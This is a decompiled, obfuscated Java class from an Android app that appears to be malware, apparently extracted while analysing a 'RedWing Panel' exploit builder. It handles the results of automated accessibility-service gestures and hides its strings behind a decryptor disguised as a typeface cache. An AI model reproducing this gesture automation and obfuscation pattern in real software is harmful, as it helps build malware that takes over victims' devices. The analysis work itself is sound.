package v.s;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class XlFTiUImwb1gEhg extends AccessibilityService.GestureResultCallback {
    public final /* synthetic */ int dDIMxZXP1V8HdM = 1;
    public final /* synthetic */ Object w9sT1Swbhx3hs;

    public XlFTiUImwb1gEhg(DataQFAdapter dataQFAdapter) {
        this.w9sT1Swbhx3hs = dataQFAdapter;
    }

    @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
    public final void onCancelled(GestureDescription gestureDescription) {
        switch (this.dDIMxZXP1V8HdM) {
            case 0:
                String unused = DataQFAdapter.TAG;
                TypefaceCache.obtain("00630075005A008900F300BA00DE00AB00260072001B00CF00F200A600C200A6003000650012");
                ((JRdueaGIH5g8DVCPba) this.w9sT1Swbhx3hs).w9sT1Swbhx3hs();
                break;
            default:
                DataQFAdapter dataQFAdapter = (DataQFAdapter) this.w9sT1Swbhx3hs;
                dataQFAdapter.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter, 0 + 23), 80L);
                break;
        }
    }

    @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
    public final void onCompleted(GestureDescription gestureDescription) {
        switch (this.dDIMxZXP1V8HdM) {
            case 0:
                String unused = DataQFAdapter.TAG;
                TypefaceCache.obtain("006300750054008A00E000B300D700B300260072001B00CF00F200A600C200A6003000650012");
                ((JRdueaGIH5g8DVCPba) this.w9sT1Swbhx3hs).w9sT1Swbhx3hs();
                break;
            default:
                DataQFAdapter dataQFAdapter = (DataQFAdapter) this.w9sT1Swbhx3hs;
                dataQFAdapter.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter, 24), 80L);
                break;
        }
    }

    public XlFTiUImwb1gEhg(String str, JRdueaGIH5g8DVCPba jRdueaGIH5g8DVCPba) {
        this.w9sT1Swbhx3hs = jRdueaGIH5g8DVCPba;
    }
}
